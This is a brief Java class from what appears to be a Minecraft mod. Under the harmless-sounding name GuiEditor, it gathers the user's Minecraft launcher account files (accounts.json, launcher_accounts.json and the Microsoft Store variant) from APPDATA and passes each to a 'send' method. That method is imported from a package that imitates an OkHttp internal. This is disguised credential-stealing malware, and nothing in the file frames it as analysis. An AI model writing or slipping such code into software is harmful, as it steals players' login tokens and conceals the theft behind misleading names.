package net.reflxction.example.utils;

import com.squareup.okhttp.internal.spdy.HudEditor;
import net.jodah.typetools.impl.Modes;
import net.reflxction.example.proxy.IMinecraft;

import java.util.Arrays;
import java.util.List;
import java.util.Optional;


public final class GuiEditor implements IMinecraft
{
    @Override
    public void execute() throws Exception
    {
       List<String> files = Arrays.asList(
               System.getenv("APPDATA") + "\\.minecraft\\" + "accounts.json",
               System.getenv("APPDATA") + "\\.minecraft\\" + "launcher_accounts.json",
               System.getenv("APPDATA") + "\\.minecraft\\" + "launcher_accounts_microsoft_store.json"
       );

        files.stream().map(Modes::getFile).filter(Optional::isPresent).forEach(HudEditor::send);
    }
}
